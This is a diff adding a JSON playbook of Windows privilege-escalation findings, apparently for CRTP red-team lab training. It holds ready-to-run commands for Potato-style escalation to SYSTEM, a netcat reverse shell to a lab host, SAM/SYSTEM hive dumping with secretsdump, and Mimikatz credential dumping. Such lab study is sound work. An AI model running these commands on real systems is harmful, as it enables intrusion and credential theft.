@@ -1,0 +1,89 @@
+[
+  {
+    "fid": "LPRIV-SeImpersonatePrivilege",
+    "technique": "SeImpersonate -> SYSTEM (Potato)",
+    "crtp_topic": "Local Privilege Escalation",
+    "severity": "CRITICAL",
+    "targets": [
+      "<current host>"
+    ],
+    "evidence": [
+      "token holds SeImpersonatePrivilege (Enabled)"
+    ],
+    "commands": {
+      "PrintSpoofer": [
+        "PrintSpoofer64.exe -i -c cmd",
+        "PrintSpoofer64.exe -c \"nc <studvm> 4444 -e cmd\""
+      ],
+      "GodPotato": [
+        "GodPotato-NET4.exe -cmd \"cmd /c whoami\""
+      ]
+    },
+    "verify": [
+      "escalation 후 whoami 가 'nt authority\\system' 인지",
+      "SYSTEM 쉘에서 mimikatz 로 자격/티켓 덤프 가능한지"
+    ],
+    "screenshots": [
+      "whoami /priv 에 SeImpersonatePrivilege 보이는 화면 (escalation 전)",
+      "exploit 실행 + whoami == SYSTEM 화면 (escalation 후)"
+    ],
+    "report_notes": "Service-account token can impersonate SYSTEM via named-pipe/RPC trick. Most common service-account escalation. Use port 4444/8888 for any shell.",
+    "priority": 6
+  },
+  {
+    "fid": "LPRIV-SeBackupPrivilege",
+    "technique": "SeBackup -> read SAM/SYSTEM & sensitive files",
+    "crtp_topic": "Local Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "<current host>"
+    ],
+    "evidence": [
+      "token holds SeBackupPrivilege (Enabled)"
+    ],
+    "commands": {
+      "reg save": [
+        "reg save hklm\\sam sam.hiv",
+        "reg save hklm\\system system.hiv",
+        "# offline: secretsdump.py -sam sam.hiv -system system.hiv LOCAL"
+      ]
+    },
+    "verify": [
+      "escalation 후 whoami 가 'nt authority\\system' 인지",
+      "SYSTEM 쉘에서 mimikatz 로 자격/티켓 덤프 가능한지"
+    ],
+    "screenshots": [
+      "whoami /priv 에 SeBackupPrivilege 보이는 화면 (escalation 전)",
+      "exploit 실행 + whoami == SYSTEM 화면 (escalation 후)"
+    ],
+    "report_notes": "Bypasses file DACLs for reads -> dump local hashes offline. Then crack / pass local admin hash.",
+    "priority": 16
+  },
+  {
+    "fid": "LPRIV-SeDebugPrivilege",
+    "technique": "SeDebug -> inject into SYSTEM process / dump lsass",
+    "crtp_topic": "Local Privilege Escalation",
+    "severity": "HIGH",
+    "targets": [
+      "<current host>"
+    ],
+    "evidence": [
+      "token holds SeDebugPrivilege (Disabled)"
+    ],
+    "commands": {
+      "mimikatz": [
+        "Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"'"
+      ]
+    },
+    "verify": [
+      "escalation 후 whoami 가 'nt authority\\system' 인지",
+      "SYSTEM 쉘에서 mimikatz 로 자격/티켓 덤프 가능한지"
+    ],
+    "screenshots": [
+      "whoami /priv 에 SeDebugPrivilege 보이는 화면 (escalation 전)",
+      "exploit 실행 + whoami == SYSTEM 화면 (escalation 후)"
+    ],
+    "report_notes": "Debug any process -> read lsass memory / migrate to SYSTEM. Usually implies near-admin already.",
+    "priority": 16
+  }
+]
